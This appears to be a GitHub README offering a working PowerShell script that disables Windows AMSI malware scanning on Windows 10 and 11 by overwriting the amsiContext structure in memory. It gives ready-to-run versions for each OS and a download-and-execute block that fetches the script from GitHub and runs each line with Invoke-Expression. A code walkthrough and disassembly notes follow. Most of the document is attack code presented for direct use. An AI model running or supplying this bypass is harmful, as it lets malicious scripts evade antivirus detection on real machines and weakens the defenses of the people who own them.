# AMSI-Bypass-Win10-11
Script to bypass AMSI on Win 10 and Win 11 by exploiting AmsiOpenSession.
While the very well known AmsiScanBuffer in memory patching technique takes some tweeking and obfuscation to work, this method (at time of writing) works straight out of the box.
Lots of people to thank for all the tech info so a full write up with screenshots\references\blog posts is in the works.

<b>Win 10 Version</b>

```
$a=[Ref].Assembly.GetTypes();
Foreach($b in $a) {if ($b.Name -like “*iUtils”) {$c=$b}};
$d=$c.GetFields(‘NonPublic,Static’);
Foreach($e in $d) {if ($e.Name -like “*Context”) {$f=$e}};
$g=$f.GetValue($null);
[IntPtr]$ptr=$g;
[Int32[]]$buf = @(0);
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```      

<b>Win 11 Version</b>
```
$a=[Ref].Assembly.GetTypes();
Foreach($b in $a) {if ($b.Name -like “*iUtils”) {$c=$b}};
$d=$c.GetFields(‘NonPublic,Static’);
Foreach($e in $d) {if ($e.Name -like “*Context”) {$f=$e}};
$g=$f.GetValue($null);
$buf = New-Object byte[](8);
$ptr= [System.IntPtr]::Add([System.IntPtr]$g, 0x8);
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 8)
```

<b>Download and execute in memory</b>
```
# Replace with Win11 link if needed
$url = 'https://raw.githubusercontent.com/MattSteedWork/AMSI-Bypass-Win10-11/refs/heads/main/AmsiBypassWin10'

$response = Invoke-WebRequest -Uri $url -UseBasicParsing
$content = $response.Content

# Split the content into lines
$lines = $content -split "`n"

# Execute each line
foreach ($line in $lines) {
    if ($line.Trim() -ne ""){
    Invoke-Expression $line
    }
}
```
# Whats actually happening here? (Short Win10 Version)

<img width="959" alt="amsicontext2" src="https://github.com/user-attachments/assets/1d8e871a-e202-4bc7-850a-a6d0bdfcc73c">

\
AmsiOpenSession compares the first 4 bytes of amsiContext to the HEX value equivalent of 'AMSI'. If this operation fails it jumps to the code block 

\
```mov eax, 80070057h``` 

<img width="453" alt="3" src="https://github.com/user-attachments/assets/87e0771c-c506-4fae-8968-2f92a74d67bc">


\
80070057h = E_INVALIDARG

\
This bypasses all scans while that PowerShell process is running.

## AmsiOpenSession Struct
<img width="438" alt="struct" src="https://github.com/user-attachments/assets/7a7f2def-7dce-4b36-b376-7a15b2e87ede">


## Win 10

<img width="412" alt="openSession2" src="https://github.com/user-attachments/assets/dd5b8169-d449-42eb-b28e-c9a7680a7513">


## Win 11

<img width="365" alt="cutterWin10" src="https://github.com/user-attachments/assets/1df3e389-0ca7-48e2-af3f-3c60980290cb">


# Whats actually happening here? (Win 11 short Version)

AmsiOpenSession takes amsiContext as an input and stores it in RCX. 
This script gets a pointer to the address of amsiContext by drilling down through types associated with the PowerShell session, overwrites the memory location of the '$ptr' (amsiContext 0x0 + 8 bytes) with 8 bytes of zeros. '$ptr' corresponds with RCX + 8 bytes in AmsiOpenSession, if cmp RCX + 8, 0 returns true it will cause EAX to be set to 0x80070057. 0x80070057 is an E_INVALIDARG error. This will bypass AMSI for the remainder of the PowerShell session.

 
## Explaination of Code


Retrieve all the types from the currently executing assembly
```
$a=[Ref].Assembly.GetTypes();
```
(Look for amsiUtils) Iterate over each type in $a. If the type's name matches the pattern *iUtils assign that type to the variable $c
```
Foreach($b in $a) {if ($b.Name -like “*iUtils”) {$c=$b}};
```
Get all non-public static fields of the type stored in $c and assigns them to $d    
```
$d=$c.GetFields(‘NonPublic,Static’);
```
(Look for amsiContext) Iterate over each field in $d. If the field's name matches the pattern *Context assign that field to the variable $f
```
Foreach($e in $d) {if ($e.Name -like “*Context”) {$f=$e}};
```
Retrieves the value of the static field stored in $f     
```
$g=$f.GetValue($null);
```
Cast the value of $g to an IntPtr type and assign it to $ptr 
```
[IntPtr]$ptr=$g;
```
Create an array of integers with a single element 0 and assigns it to $buf 
 ```
[Int32[]]$buf = @(0);
```
Copy the value 0 from the array $buf to the memory location pointed to by $ptr  
```
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```      


